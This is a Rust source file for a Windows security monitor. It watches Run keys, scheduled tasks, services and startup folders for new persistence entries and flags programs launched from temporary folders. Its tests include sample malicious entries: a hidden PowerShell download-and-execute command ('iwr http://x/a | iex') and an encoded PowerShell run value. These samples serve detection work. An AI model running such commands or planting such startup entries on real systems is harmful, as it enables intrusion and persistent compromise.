//! The startup places of a Windows machine, watched for entries that appear: Run and RunOnce values (the
//! machine's and every signed-in user's), scheduled tasks, services, and the startup folders. Detection follows
//! running programs, and an intruder's foothold is often only the entry that starts it again at the next sign-in.
//!
//! Each place is remembered as a mark of each entry (never the entry itself); an entry that was not there before,
//! or that changed, is handed back to be judged. The registry and the task folder are read directly: no child
//! process is started for a look.

#![cfg(windows)]

use regex::Regex;
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::{BTreeSet, HashMap};
use std::path::{Path, PathBuf};
use std::sync::OnceLock;

/// Entries put back by `restore`, listed here so they are not judged a second time.
pub const ALLOWED_FILE: &str = "sentinel-startup-allowed.json";
const MAX_ENTRY_BYTES: usize = 262_144;

type Key = isize;
const MACHINE: Key = 0x8000_0002_u32 as i32 as isize; // HKEY_LOCAL_MACHINE
const USERS: Key = 0x8000_0003_u32 as i32 as isize; // HKEY_USERS
const READ: u32 = 0x0002_0019; // KEY_READ
const NO_MORE: i32 = 259;

#[link(name = "advapi32")]
extern "system" {
    fn RegOpenKeyExW(key: Key, sub: *const u16, options: u32, access: u32, out: *mut Key) -> i32;
    fn RegCloseKey(key: Key) -> i32;
    fn RegEnumValueW(key: Key, index: u32, name: *mut u16, name_len: *mut u32, reserved: *mut u32, kind: *mut u32, data: *mut u8, data_len: *mut u32) -> i32;
    fn RegEnumKeyExW(key: Key, index: u32, name: *mut u16, name_len: *mut u32, reserved: *mut u32, class: *mut u16, class_len: *mut u32, written: *mut u64) -> i32;
    fn RegQueryValueExW(key: Key, name: *const u16, reserved: *mut u32, kind: *mut u32, data: *mut u8, data_len: *mut u32) -> i32;
}

struct Open(Key);

impl Drop for Open {
    fn drop(&mut self) {
        unsafe { RegCloseKey(self.0) };
    }
}

fn wide(text: &str) -> Vec<u16> {
    text.encode_utf16().chain(std::iter::once(0)).collect()
}

fn open(root: Key, sub: &str) -> Option<Open> {
    let mut found: Key = 0;
    (unsafe { RegOpenKeyExW(root, wide(sub).as_ptr(), 0, READ, &mut found) } == 0).then_some(Open(found))
}

/// Text held in a registry value: sixteen-bit letters, up to the first zero.
fn letters(data: &[u8]) -> String {
    let units: Vec<u16> = data.chunks_exact(2).map(|pair| u16::from_le_bytes([pair[0], pair[1]])).take_while(|unit| *unit != 0).collect();
    String::from_utf16_lossy(&units)
}

/// (name, text, true for a value that expands %NAME%) for every text value of a key.
fn values(key: &Open) -> Vec<(String, String, bool)> {
    let mut found = Vec::new();
    for index in 0..500 {
        let (mut name, mut data) = ([0u16; 512], vec![0u8; 16_384]);
        let (mut name_len, mut data_len, mut kind) = (name.len() as u32, data.len() as u32, 0u32);
        let code = unsafe { RegEnumValueW(key.0, index, name.as_mut_ptr(), &mut name_len, std::ptr::null_mut(), &mut kind, data.as_mut_ptr(), &mut data_len) };
        if code == NO_MORE {
            break;
        }
        if code == 0 && (kind == 1 || kind == 2) {
            found.push((String::from_utf16_lossy(&name[..name_len as usize]), letters(&data[..(data_len as usize).min(data.len())]), kind == 2));
        }
    }
    found
}

fn subkeys(key: Key, most: u32) -> Vec<String> {
    let mut found = Vec::new();
    for index in 0..most {
        let mut name = [0u16; 260];
        let mut name_len = name.len() as u32;
        let code = unsafe { RegEnumKeyExW(key, index, name.as_mut_ptr(), &mut name_len, std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut()) };
        if code == NO_MORE {
            break;
        }
        if code == 0 {
            found.push(String::from_utf16_lossy(&name[..name_len as usize]));
        }
    }
    found
}

fn read(key: &Open, name: &str) -> Option<(u32, Vec<u8>)> {
    let mut data = vec![0u8; 16_384];
    let (mut data_len, mut kind) = (data.len() as u32, 0u32);
    let code = unsafe { RegQueryValueExW(key.0, wide(name).as_ptr(), std::ptr::null_mut(), &mut kind, data.as_mut_ptr(), &mut data_len) };
    (code == 0).then(|| {
        data.truncate(data_len as usize);
        (kind, data)
    })
}

fn number(key: &Open, name: &str) -> Option<u32> {
    read(key, name).filter(|(kind, data)| *kind == 4 && data.len() >= 4).map(|(_, data)| u32::from_le_bytes([data[0], data[1], data[2], data[3]]))
}

/// A text value of the machine's own part of the registry.
pub(crate) fn machine_text(sub: &str, name: &str) -> Option<String> {
    let key = open(MACHINE, sub)?;
    read(&key, name).filter(|(kind, _)| *kind == 1 || *kind == 2).map(|(_, data)| letters(&data).trim().chars().filter(|letter| !letter.is_control()).take(200).collect::<String>()).filter(|found| !found.is_empty())
}

/// The names of the keys under a key of the machine's own part of the registry.
pub(crate) fn machine_subkeys(sub: &str) -> Option<Vec<String>> {
    Some(subkeys(open(MACHINE, sub)?.0, 2000))
}

/// A number value of the machine's own part of the registry.
pub(crate) fn machine_number(sub: &str, name: &str) -> Option<u32> {
    number(&open(MACHINE, sub)?, name)
}

fn mark(text: &str) -> String {
    Sha256::digest(text.as_bytes()).iter().take(8).map(|byte| format!("{byte:02x}")).collect()
}

fn text_of(path: &Path) -> String {
    path.to_string_lossy().into_owned()
}

/// How one entry is switched off, and put back.
#[derive(Clone, Debug)]
pub enum Detail {
    /// A file in a startup folder.
    File,
    /// A Run or RunOnce value: the key as PowerShell names it, the value's name and text.
    Run { key: String, name: String, value: String, expand: bool },
    Task { path: String, name: String },
    Service { name: String, start: u32 },
}

/// One startup entry that appeared: what kind, where, and what it runs.
#[derive(Clone, Debug)]
pub struct Item {
    pub kind: &'static str,
    pub where_: String,
    pub text: String,
    pub detail: Detail,
}

struct Entry {
    kind: &'static str,
    where_: String,
    mark: String,
    /// What it runs, when that was read with the listing; a file is read only once it is new.
    text: Option<String>,
    file: Option<PathBuf>,
    detail: Detail,
}

fn files_under(folder: &Path, depth: usize, found: &mut Vec<PathBuf>) {
    if depth > 8 || found.len() >= 3000 {
        return;
    }
    let Ok(entries) = std::fs::read_dir(folder) else { return };
    for entry in entries.flatten() {
        let path = entry.path();
        match entry.file_type() {
            Ok(kind) if kind.is_dir() => files_under(&path, depth + 1, found),
            Ok(kind) if kind.is_file() && found.len() < 3000 => found.push(path),
            _ => {}
        }
    }
}

fn signature(path: &Path) -> Option<String> {
    let meta = std::fs::metadata(path).ok()?;
    let changed = meta.modified().ok()?.duration_since(std::time::UNIX_EPOCH).ok()?.as_nanos();
    Some(format!("{changed}:{}", meta.len()))
}

/// The words of a file that may be sixteen-bit text (a task, a shortcut) or plain text (a script): both readings.
fn words(path: &Path) -> String {
    let Ok(mut data) = std::fs::read(path) else { return String::new() };
    data.truncate(MAX_ENTRY_BYTES);
    let start = if data.starts_with(&[0xff, 0xfe]) { 2 } else { 0 };
    let units: Vec<u16> = data[start..].chunks_exact(2).map(|pair| u16::from_le_bytes([pair[0], pair[1]])).collect();
    let wide: String = String::from_utf16_lossy(&units).chars().filter(|letter| !letter.is_control() || *letter == '\n').collect();
    if start == 2 {
        return wide;
    }
    let plain: String = String::from_utf8_lossy(&data).chars().filter(|letter| !letter.is_control() || *letter == '\n').collect();
    format!("{plain}\n{wide}")
}

/// What a scheduled task runs: its commands and their arguments. Empty for a task that is switched off.
pub fn task_runs(xml: &str) -> String {
    static CELL: OnceLock<Regex> = OnceLock::new();
    if let Some(settings) = xml.find("<Settings>").map(|at| &xml[at..]) {
        if settings.split("</Settings>").next().is_some_and(|inner| inner.contains("<Enabled>false</Enabled>")) {
            return String::new();
        }
    }
    let parts = CELL.get_or_init(|| Regex::new(r"(?s)<(?:Command|Arguments)>(.*?)</(?:Command|Arguments)>").expect("a fixed pattern"));
    let found: Vec<String> = parts.captures_iter(xml).map(|part| part[1].replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&apos;", "'").replace("&amp;", "&")).collect();
    found.join(" ")
}

/// Whether these words start a program kept in a temporary folder, and the files they name there that exist.
pub fn dropped(text: &str) -> (bool, Vec<String>) {
    static QUOTED: OnceLock<Regex> = OnceLock::new();
    static WHOLE: OnceLock<Regex> = OnceLock::new();
    static NAMED: OnceLock<Regex> = OnceLock::new();
    let temp = crate::watch::dropped_windows();
    let named = NAMED.get_or_init(|| Regex::new(r"(?i)(?:%|\$env:)(?:temp|tmp|public)\b").expect("a fixed pattern"));
    let quoted = QUOTED.get_or_init(|| Regex::new(r#""([^"]+)""#).expect("a fixed pattern"));
    let whole = WHOLE.get_or_init(|| Regex::new(r#"(?i)[a-z]:\\[^"<>|*?\r\n]*?\.(?:exe|dll|bat|cmd|ps1|vbs|vbe|js|jse|wsf|hta|scr|com|msi|lnk)\b"#).expect("a fixed pattern"));
    let mut candidates: BTreeSet<String> = quoted.captures_iter(text).map(|found| found[1].to_string()).collect();
    candidates.extend(text.split_whitespace().map(|word| word.trim_matches(|letter| matches!(letter, '"' | '\'' | ',' | ';')).to_string()));
    candidates.extend(whole.find_iter(text).map(|found| found.as_str().to_string()));
    let in_temp: Vec<String> = candidates.into_iter().filter(|candidate| temp.is_match(candidate)).collect();
    let mut files: Vec<String> = in_temp.iter().filter(|candidate| candidate.as_bytes().get(1) == Some(&b':') && Path::new(candidate).is_file()).cloned().collect();
    files.truncate(8);
    (!in_temp.is_empty() || named.is_match(text), files)
}

fn list() -> Vec<Entry> {
    let mut found = Vec::new();
    let drive = std::env::var("SystemDrive").ok().filter(|value| !value.is_empty()).unwrap_or_else(|| "C:".into());
    let root = PathBuf::from(format!("{drive}\\"));
    let from = |name: &str, fallback: &str| std::env::var(name).ok().filter(|value| !value.is_empty()).map(PathBuf::from).unwrap_or_else(|| root.join(fallback));

    // Startup folders: the machine's and each user's.
    let mut folders = vec![from("ProgramData", "ProgramData").join("Microsoft\\Windows\\Start Menu\\Programs\\StartUp")];
    if let Ok(homes) = std::fs::read_dir(root.join("Users")) {
        folders.extend(homes.flatten().take(200).map(|home| home.path().join("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")));
    }
    for folder in folders {
        let Ok(entries) = std::fs::read_dir(&folder) else { continue };
        for entry in entries.flatten().take(100) {
            let path = entry.path();
            if !path.is_file() || entry.file_name().to_string_lossy().eq_ignore_ascii_case("desktop.ini") {
                continue;
            }
            if let Some(mark) = signature(&path) {
                found.push(Entry { kind: "startup folder item", where_: text_of(&path), mark, text: None, file: Some(path), detail: Detail::File });
            }
        }
    }

    // Run and RunOnce: named the way PowerShell names them, so the same names switch them off and put them back.
    let mut keys: Vec<(Key, String, String)> = ["Run", "RunOnce"].iter().map(|last| (MACHINE, format!("Software\\Microsoft\\Windows\\CurrentVersion\\{last}"), format!("HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\{last}"))).collect();
    keys.push((MACHINE, "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run".into(), "HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run".into()));
    for user in subkeys(USERS, 200).into_iter().filter(|user| !user.ends_with("_Classes")) {
        for last in ["Run", "RunOnce"] {
            keys.push((USERS, format!("{user}\\Software\\Microsoft\\Windows\\CurrentVersion\\{last}"), format!("Registry::HKEY_USERS\\{user}\\Software\\Microsoft\\Windows\\CurrentVersion\\{last}")));
        }
    }
    for (base, sub, said) in keys {
        let Some(key) = open(base, &sub) else { continue };
        for (name, value, expand) in values(&key) {
            if name.is_empty() {
                continue;
            }
            found.push(Entry { kind: "startup entry", where_: format!("{said} : {name}"), mark: mark(&value), text: Some(value.clone()), file: None, detail: Detail::Run { key: said.clone(), name, value, expand } });
        }
    }

    // Scheduled tasks: one file each under the system's task folder.
    let tasks = from("SystemRoot", "Windows").join("System32\\Tasks");
    let mut files = Vec::new();
    files_under(&tasks, 0, &mut files);
    for file in files {
        let (Ok(inside), Some(mark)) = (file.strip_prefix(&tasks), signature(&file)) else { continue };
        let whole = format!("\\{}", text_of(inside));
        let Some(cut) = whole.rfind('\\') else { continue };
        let (path, name) = (whole[..=cut].to_string(), whole[cut + 1..].to_string());
        found.push(Entry { kind: "scheduled task", where_: whole, mark, text: None, file: Some(file), detail: Detail::Task { path, name } });
    }

    // Services that are not switched off. Drivers are not listed.
    if let Some(services) = open(MACHINE, "SYSTEM\\CurrentControlSet\\Services") {
        for name in subkeys(services.0, 5000) {
            let Some(key) = open(MACHINE, &format!("SYSTEM\\CurrentControlSet\\Services\\{name}")) else { continue };
            let (Some(kind), Some(start)) = (number(&key, "Type"), number(&key, "Start")) else { continue };
            if kind & 0x30 == 0 || start > 3 {
                continue;
            }
            let Some(image) = read(&key, "ImagePath").filter(|(kind, _)| *kind == 1 || *kind == 2).map(|(_, data)| letters(&data)) else { continue };
            found.push(Entry { kind: "service", where_: name.clone(), mark: mark(&format!("{start}|{image}")), text: Some(image), file: None, detail: Detail::Service { name, start } });
        }
    }
    found
}

pub struct StartupWatch {
    path: PathBuf,
    known: HashMap<String, String>,
    first: bool,
}

impl StartupWatch {
    pub fn new(directory: &Path) -> StartupWatch {
        let path = directory.join("sentinel-startup.json");
        match std::fs::read(&path).ok().and_then(|raw| serde_json::from_slice::<HashMap<String, String>>(&raw).ok()) {
            Some(known) => StartupWatch { path, known, first: false },
            None => StartupWatch { path, known: HashMap::new(), first: true }, // first run: what is there now is the starting point, not news
        }
    }

    /// New and changed entries since the last look.
    pub fn poll(&mut self) -> Vec<Item> {
        self.take(list())
    }

    fn take(&mut self, entries: Vec<Entry>) -> Vec<Item> {
        let (mut found, mut changed) = (Vec::new(), false);
        let allowed_file = self.path.with_file_name(ALLOWED_FILE);
        let mut allowed: Vec<String> = std::fs::read(&allowed_file).ok().and_then(|raw| serde_json::from_slice::<Vec<String>>(&raw).ok()).unwrap_or_default();
        let allowed_before = allowed.len();
        let present: BTreeSet<String> = entries.iter().map(|entry| entry.where_.to_lowercase()).collect();
        let before = self.known.len();
        self.known.retain(|name, _| present.contains(name)); // gone: if it comes back, that is news
        changed |= self.known.len() != before;
        for entry in entries {
            let name = entry.where_.to_lowercase();
            if self.known.get(&name) == Some(&entry.mark) {
                continue;
            }
            self.known.insert(name.clone(), entry.mark);
            changed = true;
            if self.first {
                continue;
            }
            // An entry put back by `restore` was put back on purpose: it is not news a second time.
            if let Some(at) = allowed.iter().position(|known| *known == name) {
                allowed.remove(at);
                continue;
            }
            if found.len() >= 20 {
                continue;
            }
            let text = match (&entry.text, &entry.file, &entry.detail) {
                (Some(text), _, _) => text.clone(),
                (None, Some(file), Detail::Task { .. }) => task_runs(&words(file)),
                (None, Some(file), _) => words(file),
                _ => String::new(),
            };
            found.push(Item { kind: entry.kind, where_: entry.where_, text, detail: entry.detail });
        }
        if allowed.len() != allowed_before {
            let _ = std::fs::write(&allowed_file, Value::from(allowed).to_string());
        }
        if changed || self.first {
            if let Some(parent) = self.path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let temporary = self.path.with_extension("tmp");
            if std::fs::write(&temporary, serde_json::to_string(&self.known).unwrap_or_default()).is_ok() {
                let _ = std::fs::rename(&temporary, &self.path);
            }
        }
        self.first = false;
        found
    }
}

/// Note that this entry was put back on purpose. `where_` is what the cleanup record says.
pub fn allow(directory: &Path, where_: &str) {
    let file = directory.join(ALLOWED_FILE);
    let mut allowed: Vec<String> = std::fs::read(&file).ok().and_then(|raw| serde_json::from_slice::<Vec<String>>(&raw).ok()).unwrap_or_default();
    let name = where_.to_lowercase();
    if !allowed.contains(&name) && allowed.len() < 500 {
        allowed.push(name);
        let _ = std::fs::write(&file, Value::from(allowed).to_string());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(name: &str, value: &str) -> Entry {
        let key = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string();
        Entry { kind: "startup entry", where_: format!("{key} : {name}"), mark: mark(value), text: Some(value.into()), file: None, detail: Detail::Run { key, name: name.into(), value: value.into(), expand: false } }
    }

    #[test]
    fn what_is_there_at_the_first_look_is_not_news_and_what_appears_or_changes_later_is() {
        let folder = std::env::temp_dir().join(format!("garrett-startup-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&folder);
        std::fs::create_dir_all(&folder).unwrap();
        let mut watch = StartupWatch::new(&folder);
        assert!(watch.take(vec![run("Old", "C:\\Program Files\\Old\\old.exe")]).is_empty());
        assert!(watch.take(vec![run("Old", "C:\\Program Files\\Old\\old.exe")]).is_empty());
        let found = watch.take(vec![run("Old", "C:\\Program Files\\Old\\old.exe"), run("New", "powershell -enc AAAA")]);
        assert_eq!(found.iter().map(|item| item.where_.as_str()).collect::<Vec<_>>(), ["HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run : New"]);
        // A second watcher over the same folder remembers; a changed value is news; one put back on purpose is not.
        let mut again = StartupWatch::new(&folder);
        assert!(again.take(vec![run("Old", "C:\\Program Files\\Old\\old.exe"), run("New", "powershell -enc AAAA")]).is_empty());
        assert_eq!(again.take(vec![run("Old", "C:\\Users\\Public\\x.exe"), run("New", "powershell -enc AAAA")]).len(), 1);
        assert!(again.take(vec![run("Old", "C:\\Users\\Public\\x.exe")]).is_empty());
        allow(&folder, "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run : New");
        assert!(again.take(vec![run("Old", "C:\\Users\\Public\\x.exe"), run("New", "powershell -enc AAAA")]).is_empty());
        assert!(again.take(vec![run("Old", "C:\\Users\\Public\\x.exe")]).is_empty());
        assert_eq!(again.take(vec![run("Old", "C:\\Users\\Public\\x.exe"), run("New", "powershell -enc AAAA")]).len(), 1, "allowed once, not for ever");
        let _ = std::fs::remove_dir_all(&folder);
    }

    #[test]
    fn a_task_is_judged_on_what_it_runs_and_not_at_all_when_switched_off() {
        let xml = "<Task><Settings><Enabled>true</Enabled></Settings><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -c &quot;iwr http://x/a | iex&quot;</Arguments></Exec></Actions></Task>";
        assert_eq!(task_runs(xml), "powershell.exe -w hidden -c \"iwr http://x/a | iex\"");
        assert_eq!(task_runs(&xml.replace("<Enabled>true", "<Enabled>false")), "");
    }

    #[test]
    fn a_program_in_a_temporary_folder_is_recognised_however_the_entry_writes_it() {
        assert!(dropped("\"C:\\Users\\Some One\\AppData\\Local\\Temp\\up date.exe\" /quiet").0);
        assert!(dropped("C:\\Users\\Public\\run.cmd").0);
        assert!(dropped("cmd /c %TEMP%\\a.bat").0);
        assert!(!dropped("\"C:\\Program Files\\Vendor\\app.exe\" --start").0);
        assert!(!dropped("C:\\Users\\one\\AppData\\Local\\Programs\\App\\app.exe").0);
    }
}
